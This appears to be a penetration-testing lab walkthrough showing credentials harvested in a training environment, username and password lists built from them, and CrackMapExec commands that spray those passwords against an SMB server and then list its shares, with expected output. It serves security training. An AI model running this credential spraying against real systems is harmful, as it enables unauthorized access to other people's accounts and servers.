# Domain Credentials

Displaying contents of creds.txt
>``` shell
>kali@kali:~/beyond$ cat creds.txt 
>
># ========== Expected Result ==========
>daniela:tequieromucho (SSH private key passphrase)
>wordpress:DanielKeyboard3311 (WordPress database connection settings)
>john:dqsTwTpZPn#nL (fetch_current.sh)
>
>Other identified users:
>marcus
># =====================================
>```

Displaying the created lists containing the identified usernames and passwords
>``` shell
>kali@kali:~/beyond$ cat usernames.txt 
>
># ========== Expected Result ==========
>marcus
>john
>daniela
># =====================================
>
>kali@kali:~/beyond$ cat passwords.txt
>
># ========== Expected Result ==========
>tequieromucho
>DanielKeyboard3311
>dqsTwTpZPn#nL
># =====================================
>```

Checking for valid credentials with CrackMapExec
>``` shell
>kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
>
># ========== Expected Result ==========
>SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
>SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
>SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
>SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
>SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
>SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
>SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
>SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
>SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
>SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
># =====================================
>```

Listing SMB shares on MAILSRV1 with CrackMapExec
>``` shell
>kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares  
>
># ========== Expected Result ==========
>SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
>SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
>SMB         192.168.50.242  445    MAILSRV1         [+] Enumerated shares
>SMB         192.168.50.242  445    MAILSRV1         Share           Permissions     Remark
>SMB         192.168.50.242  445    MAILSRV1         -----           -----------     ------
>SMB         192.168.50.242  445    MAILSRV1         ADMIN$                          Remote Admin
>SMB         192.168.50.242  445    MAILSRV1         C$                              Default share
>SMB         192.168.50.242  445    MAILSRV1         IPC$            READ            Remote IPC
># =====================================
>```
